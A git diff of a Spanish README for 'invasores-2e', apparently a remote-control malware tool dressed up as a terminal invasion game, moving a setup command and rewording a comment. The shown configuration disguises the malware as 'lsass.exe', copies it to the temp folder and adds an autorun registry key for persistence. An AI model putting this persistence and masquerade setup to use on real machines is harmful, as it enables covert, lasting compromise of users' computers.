@@ -17,7 +17,6 @@ Se trata de un videojuego terminal. Tú eres un Furon (raza extraterrestre avanz
 git clone https://github.com/Kirari-Senpai/invasores-2e.git
 cd invasores-2e/
 pip3 install -r requirements.txt
-cd server/
 ```
 
 ## Configurar servidor ##
@@ -58,7 +57,7 @@ Otra pequeña configuración es el de la persistencia:
 ```
 NOMBRE_MALWARE = "lsass.exe"        # Acá podrán cambiar el nombre del malware que será copiado para obtener persistencia
 RUTA_MALWARE_DESTINO = tempfile.gettempdir() + "\\" + NOMBRE_MALWARE    # La ruta donde se copiará el malware. Por defecto, se copiará en los archivos temporales del usuario
-NOMBRE_REGISTRO_MALWARE = NOMBRE_MALWARE[:-4]   # Nombre que tendrá el registro de autoejecucion del malware, por defecto lleva el nombre original del programa
+NOMBRE_REGISTRO_MALWARE = NOMBRE_MALWARE[:-4]   # Nombre que tendrá el registro de autoejecucion del malware. Por defecto lleva el nombre original del programa
 
 ```
 
@@ -66,6 +65,7 @@ NOMBRE_REGISTRO_MALWARE = NOMBRE_MALWARE[:-4]   # Nombre que tendrá el registro
 ## Empezar con la invasión ##
 
 ```
+cd server/
 python3 invasores.py
 ```
 
